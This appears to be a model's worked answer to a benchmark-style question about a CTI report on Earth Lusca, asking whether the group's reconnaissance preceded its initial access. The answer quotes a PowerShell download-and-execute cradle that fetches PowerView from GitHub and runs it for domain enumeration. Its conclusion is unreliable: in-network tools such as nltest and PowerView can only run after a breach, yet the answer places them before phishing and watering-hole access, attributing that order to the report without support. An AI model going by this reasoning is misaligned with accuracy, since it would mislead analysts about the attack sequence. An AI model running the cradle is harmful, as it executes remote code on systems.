### Step-by-Step Analysis

1. **Analyze the CTI Report:**
   - **Reconnaissance:**
     - Used Windows utilities (net, nltest, ipconfig, netstat, tasklist) and third-party tools (adfind, PowerSploit) to gather information on user accounts, domain controllers, and network configurations.
     - Example command: `powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1');Get-NetComputer -FullData > [file path]`
   - **Initial Access:**
     - Employed spear phishing and watering hole attacks.
     - Sent spear phishing emails with malicious links to download LNK or executable files.
     - Compromised websites or created fake web pages with injected malicious JavaScript to deliver malware.

2. **Analyze the Question:**
   - The question asks if it is likely that Earth Lusca gathered network configurations and domain information using Windows utilities and PowerSploit before using spear phishing emails with malicious links or injecting malicious JavaScript into websites to achieve initial access.

3. **Compare and Evaluate:**
   - **Reconnaissance:**
     - The report clearly states that Earth Lusca used Windows utilities and PowerSploit to gather network configurations and domain information.
   - **Initial Access:**
     - The report also states that Earth Lusca used spear phishing and watering hole attacks, which involve sending emails with malicious links or injecting malicious JavaScript into websites to achieve initial access.

4. **Reasoning:**
   - The sequence described in the question aligns with the attack sequence presented in the CTI report.
   - Earth Lusca first gathered network configurations and domain information using Windows utilities and PowerSploit.
   - After gathering this information, they used spear phishing emails with malicious links or injected malicious JavaScript into websites to achieve initial access.
